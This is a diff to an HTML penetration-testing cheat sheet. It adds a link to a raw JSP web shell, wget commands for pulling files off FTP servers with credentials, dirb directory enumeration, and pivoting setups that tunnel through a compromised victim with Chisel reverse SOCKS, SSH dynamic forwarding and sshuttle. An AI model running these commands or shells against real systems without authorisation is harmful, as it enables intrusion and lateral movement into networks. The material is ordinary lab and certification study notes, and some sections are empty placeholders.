@@ -101,7 +101,8 @@
 
 <h1>Web Shells</h1>
 <p id="info">JSP</p>
-<p id="codebox"><a href="https://github.com/LaiKash/JSP-Reverse-and-Web-Shell">JSP Web Shell #1</a></p>
+<p id="codebox"><a href="https://raw.githubusercontent.com/tennc/webshell/master/jsp/shell.jsp">JSP Web Shell #1</a></p>
+<p id="codebox"><a href="https://github.com/LaiKash/JSP-Reverse-and-Web-Shell">JSP Web Shell #2</a></p>
 
 <hr>
 
@@ -112,6 +113,10 @@
 <h2>FTP - TCP/21 </h2>
 <p id="info">Download Files #1</p>
 <p id="codebox">wget -m ftp://$USERNAME:PASSWORD@$TARGET</p>
+
+
+<p id="info">Download Files ## (with credentials)</p>
+<p id="codebox">wget -r --user="$USERNAME" --password="$PASSWORD" ftp://$TARGET/</p>
 
 <h2>SMTP - TCP/25 </h2>
 <p id="info">Verify if a user exists</p>
@@ -139,6 +144,16 @@
 
 
 <h2>HTTP/S - TCP/80 & TCP/443 </h2>
+
+<p id="info"></p>
+<p id="codebox"></p>
+
+<p id="info">Finding directories & pages</p>
+<p id="codebox">dirb http://$TARGET common.txt</p>
+
+<p id="info">Finding pages with extentions (PHP)</p>
+<p id="codebox">dirb http://$TARGET  common.txt-w -X .php </p>
+
 <p id="info">Scan for CGIs</p>
 <p id="codebox">gobuster dir -u http://$TARGET/ -w /usr/share/dirb/wordlists/vulns/cgis.txt -s "200" | grep "200"</p>
 
@@ -416,17 +431,48 @@ rpcclient $> exit
 <p id="codebox"><a href="http://www.securityidiots.com/Web-Pentest/SQL-Injection/Union-based-Oracle-Injection.html">Union Based Oracle Injection Cheat Sheet #1</a></p>
 <p id="codebox"><a href="https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/">MSSQL Practical Injection Cheat Sheet #1</a></p>
 
-
-
-
-
-
-
 <hr>
 
 
 <h1>Macro Attacks</h1>
 <p id="codebox"><a href="https://github.com/JeffGThompson/offsec-notes.io/blob/main/Scripts/Windows/Macros/macro.py">Turn hta into macro</a></p>
+
+
+<hr>
+
+<h1>Pivoting</h1>
+<p id="info">Pivoting with Chisel</p>
+<p id="codebox">
+    <b>Kali</b><br>
+    ./chisel server -p 3333 --reverse --socks5<br>
+    
+    <b>Victim</b><br>
+    ./chisel client $KALIIP:3333 R:5555:socks<br>
+    
+    Add to proxychains.conf  <br>
+    socks5 127.0.0.1 5555
+</p>
+
+<p id="info">Pivoting with SSH</p>
+<p id="codebox">
+    <b>Kali</b><br>
+    sudo ssh -N -D 127.0.0.1:8080 $VictimUsername@$TARGET<br>
+    Will require a password to the server. $TARGET is the middle man server.
+</p>
+
+<p id="info"></p>
+<p id="codebox">
+    <b>Kali</b><br>
+    sshuttle -vvr sean@$TARGET 10.1.1.0/24<br>
+    Will require a password to the server. $TARGET is the middle man server.   
+</p>
+
+<p id="info"></p>
+<p id="codebox"></p>
+
+
+Setup Port Forwarding - Option 1
+
 
 
 
